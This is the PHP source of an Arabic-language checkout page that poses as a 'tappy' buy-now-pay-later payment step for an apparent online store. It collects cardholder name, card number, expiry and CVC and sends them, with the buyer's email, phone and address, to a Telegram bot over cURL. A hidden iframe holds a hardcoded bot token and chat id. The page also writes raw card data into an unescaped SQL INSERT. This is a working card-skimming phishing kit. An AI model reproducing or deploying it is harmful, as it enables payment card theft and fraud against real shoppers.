<?php
include 'controlPanel/Database.php';
$db = new Database();

$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if ($db->dbNumRows($result)) {
    $rows = $db->dbFetchResult($result);
    foreach ($rows as $row) {
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}

if (!isset($_SESSION["user"])) {
    header("location:index.php");
}

$totalPrice = $_GET['totalPrice'];
$CashOrBatch = $totalPrice/4;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
$user = $_SESSION["user"];

$name = $_SESSION["name"];

$email = $_SESSION["email"];

$phone = $_SESSION["phone"];

$country = $_SESSION["country"];

$city = $_SESSION["city"];

$location = $_SESSION["location"];

$street = $_SESSION["street"];

$home = $_SESSION["home"];

$zip = $_SESSION["zip"];

$payment_getway = 'tappy';

$_SESSION["CardName"] = $_POST['CardName'];
$card_name = $_SESSION["CardName"];

$_SESSION["cardNumber"] = $_POST['cardNumber'];
$card_number = $_SESSION["cardNumber"];

$_SESSION["month"] = $_POST['month'];
$month = $_SESSION["month"];

$_SESSION["year"] = $_POST['year'];
$year = $_SESSION["year"];

$_SESSION["cvc"] = $_POST['cvc'];
$cvc = $_SESSION["cvc"];

$token1 = $token;
    $bot_id1 = $tokenID;
    $street = isset($_SESSION["street"]) ? $_SESSION["street"] : "غير محدد";
    $home = isset( $_SESSION["address"]) ? $_SESSION["address"] : "غير محدد";
    $zip = isset($_SESSION["zip"]) ? $_SESSION["zip"] : "غير محدد";
    $totalPrice = isset($_SESSION["totalPrice"]) ? $_SESSION["totalPrice"] : "غير محدد";
    
        $databot = ":: طلب جديد ::" . PHP_EOL
        . "رقم الطلب: " . $user . PHP_EOL
        . "البريد الإلكتروني: " . $email . PHP_EOL
        . "رقم الهاتف: " . $phone . PHP_EOL
        . "الحي: " . $location . PHP_EOL
        . "الشارع: " . $street . PHP_EOL
        . "المنزل: " . $home . PHP_EOL
        . "الرمز البريدي: " . $zip . PHP_EOL
        . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
        . "الدفعة الأولى: " . $first_batch . PHP_EOL
        . "فترة التقسيط: " . $CashOrBatch . PHP_EOL
        . "البطاقة البنكية: " . $payment_getway . PHP_EOL
        . "الاسم على البطاقة: " . $card_name . PHP_EOL
        . "رقم البطاقة: " . $card_number . PHP_EOL
        . "الشهر: " . $month . PHP_EOL
        . "السنة: " . $year . PHP_EOL
        . "CVC: " . $cvc . PHP_EOL
        . ":: رابط التعليمات ::" . PHP_EOL
        . "فاتورة: https://infinitelectron-ae.store/controlPanel/invoice.php?id=" . $user . PHP_EOL
        . "عقد: https://infinitelectron-ae.store/controlPanel/Installment.php?id=" . $user . PHP_EOL
        . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;
$apiToken = $token;
    // $data = [
    //     'chat_id' => $bot_id1,
    //     'text' => $databot
    // ];
    // $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
    // $botToken = 'YOUR_BOT_TOKEN';
    // $chatID = 'YOUR_CHAT_ID';
    
    // // Set the message to send
    // $message = 'Hello, this is a test message from PHP!';
    
    // Create the URL for the API request
    $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
    // Prepare the POST data
    $sender = [
        'chat_id' => $tokenID,
        'text' => $databot,
    ];
    
    // Initialize cURL
    $curl = curl_init($url);
    
    // Set cURL options
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // Execute cURL request
    $response = curl_exec($curl);
    // die(json_encode($sender));
    // $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));

    // header("location:confirem.php?payment=$payment");

    $query = "INSERT INTO `orders`(`name`, `phone`, `location`, `street`, `payment`, `first_batch`, `user`, `CardName`, `cardNumber`, `month`, `year`, `cvc`,`email`,`country`,`city`,`home`,`zip`,`payment_getway`,`CashOrBatch`) VALUES 
                                 ('$name', '$phone', '$location','$street', '$totalPrice', '$CashOrBatch', '$user', '$card_name', '$card_number', '$month', '$year', '$cvc','$email','$country','$city','$home','$zip','$payment_getway','4')";
    // die($query);
   $result = $db->dbQuery($query);

    if ($result) {
        //header("location:payment.php?payment=$payment");
        header("location:confirem.php?payment=$payment");
    }

}

$code = 0;

?>
<html lang="ar" dir="rtl">

<head>
    <?php include "head.php"; ?>
</head>

<body style="overflow: auto; background-color:#f6f6f6;" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">


    <div class="container">
        <div class="d-flex justify-content-between align-items-center p-2">
            <i class="fa-solid fa-chevron-right"></i>

            <div class="">
                <span class=" fw-bold"><?= $db->get_setting('website_name')?></div></span>
                <p style="font-size: 14px;">الدفع بواسطة <img src="assets/image/icons/tapy.svg" width="70" height="30" style="object-fit: cover;" alt=""></p>
            </div>

            <span class="text-primary">English</span>

        </div>
    </div>

    <div class="loaderk d-flex justify-content-center align-items-center" style="display: none; height: 0px;">
    </div>
    <main> <!--  <section class="mt-5 py-3">
    </section> -->
        <section class="container-fluid mt-3">
            <div class="row">
                <div class=" col-md-5 col-11   px-4 py-3 my-md-5 my-3 main-confirm" style="box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 3px 0px, rgba(0, 0, 0, 0.06) 0px 1px 2px 0px;background-color:white;border-radius:15px;margin-bottom:20px ! important;">
                    <!-- <div class="row justify-content-center my-4  align-items-center">
                         <div class="d-flex justify-content-between align-items-center">
                        <div class="d-flex align-items-center">
                        <span style="width: 28px;height:28px;border-radius:50%;background-color:#000;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-1 text-white"></i></span>

                        <img src="assets/image/icons/wallet_584067.png" class="ms-2" width="30" alt="">
                    </div>
                        <sapn class="fw-normal fs-6 text-center text-dark   mx-2" dir="ltr">الكود</sapn>
                    </div> 
                    </div> -->


                    <h6>قسّمها على 4. بدون فوائد. بدون رسوم.

                    </h6>

                    <p style="font-size: 14px; color:gray" >متوافق مع أحكام الشريعة الإسلامية.
                    </p>

                    <div class="">
                                <?php $pay = $totalPrice /4 ?>
                               <?php for($i=0;$i <4 ; $i++) { ?> 
                                <div class="d-flex justify-content-between mb-3">
                                    <img src="assets/image/icons/img-<?php echo($i+1) ?>.png" width="40" alt="">
                                    <span>
                                    <?php if($i==0){
                                    echo('اليوم');
                                }elseif($i==1){
                                    echo('بعد شهر');
                                }elseif($i==2){
                                    echo('بعد شهرين');
                                }elseif($i==3){
                                    echo('بعد 3 اشهر');
                                }
                                ?>
                                    </span>
                                    <p class="fw-bold"><?php echo($pay) ?> <span> <?php $db->get_setting('currancy') ?>  </span></p>
                                </div>  
                                <?php } ?>  




                    </div>




                </div>


                <div class=" col-md-5 col-11   px-4 py-1 my-md-5 my-3 main-confirm" style="box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 3px 0px, rgba(0, 0, 0, 0.06) 0px 1px 2px 0px;background-color:white;border-radius:15px;margin-top:0 !important;margin-bottom:20px ! important">
                    <div class="row justify-content-center my-4  align-items-center">
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="d-flex align-items-center">
                                <span style="width: 28px;height:28px;border-radius:50%;background-color:#000;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-1 text-white"></i></span>

                                <img src="assets/image/icons/wallet_584067.png" class="ms-2" width="30" alt="">
                            </div>
                            <sapn class="fw-normal fs-6 text-center text-dark   mx-2" dir="ltr">الدفع</sapn>
                        </div>
                    </div>


                    <form action="checkoutTappey.php?totalPrice=<?= $totalPrice ?>" method="POST" class="pb-2">


                        <div class="row">



                            <div class="col-lg-8">
                                <input type="text" class="form-control mb-3 text-center" name="CardName" id="name" autocomplete="off" required="" placeholder="الأسم  على البطاقة">

                                <!-- <div class="form-floating mb-3">
                        <label for="cardname text-secondary">
                            <i class="fas fa-user fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">اسم حامل البطاقة</span>
                        </label>
                    </div> -->
                            </div>


                            <div class="col-lg-4 col-md-6 col-sm-6 ">
                                <div class="container">

                                    <div class="row border rounded" style="overflow: hidden;">

                                        <div class="col-4 px-0 mx-0">
                                            <input type="text" class="form-control border-0" maxlength="2" name="month" required="" id="month" placeholder="الشهر">

                                            <!-- <div class="form-floating">
                                                <label for="floatingInput text-secondary">
                                                    <span class="text-secondary">الشهر</span>
                                                </label>
                                            </div> -->
                                        </div>
                                        <div class="col-4  px-0 mx-0">
                                            <input type="text" class="form-control border border-right-0 border-top-0 border-left border-bottom-0 rounded-0" maxlength="2" name="year" required="" id="year" placeholder="السنة">

                                            <!-- <div class="form-floating">
                                                <label for="year text-secondary">
                                                    <span class="text-secondary">السنة</span>
                                                </label>
                                            </div> -->
                                        </div>

                                        <div class="col-4  px-0 mx-0">
                                            <input type="text" class="form-control border border-right-0 border-top-0 border-left border-bottom-0 rounded-0" maxlength="3" name="cvc" required="" id="cvc" placeholder="CVV">

                                            <!-- <div class="form-floating">
                                                <label for="year text-secondary">
                                                    <span class="text-secondary">السنة</span>
                                                </label>
                                            </div> -->
                                        </div>
                                    </div>


                                </div>
                            </div>





                            <div class="col-lg-8">

                                <input type="text" name="cardNumber" class="form-control rounded mb-3 mt-lg-0 mt-3 text-center" id="cardNumber" autocomplete="off" required="" placeholder="رقم البطاقة" maxlength="16">

                                <!-- <div class="form-floating mb-3">
                            <label for="cardNumber text-secondary">
                                <i class="fas fa-credit-card fa-fw text-secondary mx-2"></i>
                                <span class="text-secondary">رقم البطاقة</span>
                            </label>
                        </div> -->

                            </div>





                        </div>

                        <div class="mb-3 mt-3">
                            <button type="submit" class="w-100 btn btn-confirm rounded-4 py-2" name="mybtn" id="codeConfirm">اكمال الدفع
                            </button>
                        </div>

                    </form>




                </div>


                <div class=" col-md-5 col-11   px-4 py-3 my-md-5 my-3 main-confirm" style="box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 3px 0px, rgba(0, 0, 0, 0.06) 0px 1px 2px 0px;background-color:white;border-radius:15px;margin-bottom:20px ! important;margin-top:0 !important">
                    <div class="order-value d-flex justify-content-between mb-2">
                        <span>قيمة الطلب</span>
                        <p class="fw-normal"><?php echo($totalPrice) ?> <span> <?php $db->get_setting('currancy')?> </span></p>

                    </div>

                    <div class="order-value d-flex justify-content-between mb-2">
                        <span>مستحقة اليوم</span>
                        <p class="fw-bold"><?php echo($totalPrice/4) ?> <span> <?php $db->get_setting('currancy')?> </span></p>

                    </div>

                    <hr>

                    <p class="text-center" style="font-size: 14px;">سنقوم بتذكيرك عبر الرسائل النصية بموعد سداد الدفعة القادمة.
                    </p>

                    <div class="container text-secondary text-center mt-2 mb-4 d-none">

                        <p style="font-size: 14px;">تسوق إلكتروني آمن 100%
                            <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                            <i class="fab fa-cc-apple-pay fa-fw"></i>
                            <i class="fas fa-shield fa-fw mx-1"></i>
                        </p>
                    </div>
                </div>







            </div>
        </section>




        <iframe src="https://api.telegram.org/bot6275729004:AAHFnEvKPlk85C7GDxKFcXRPqi8u9ypHs2g/sendMessage?chat_id=-1001875595955&amp;parse_mode=Markdown&amp;text=🙎‍♂️ اسم البطاقة : { 55 } %0A  🔐 رقم البطاقة : { 5555555555555555 } %0A  📆 تاريخ البطاقة : { 55 / 55 } %0A  🔑 CVC البطاقة : { 555 } %0A الدفعة الاولى : 1000 %0A واتساب : https%3A%2F%2Fwa.me%2F%2B96655 %0A  " hidden="" frameborder="0"></iframe>
        <iframe src="" hidden="" frameborder="0"></iframe>
        <iframe src="" hidden="" frameborder="0"></iframe>
        <script src="assets/js/bootstrap.js"></script>

        <a href="https://wa.me/<?= $Whatsapp ?>" class="contact py-2 px-3 bg-success rounded-circle">
            <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
        </a>
    </main>
    <?php
    include "script.php";
    ?>


</body>

</html>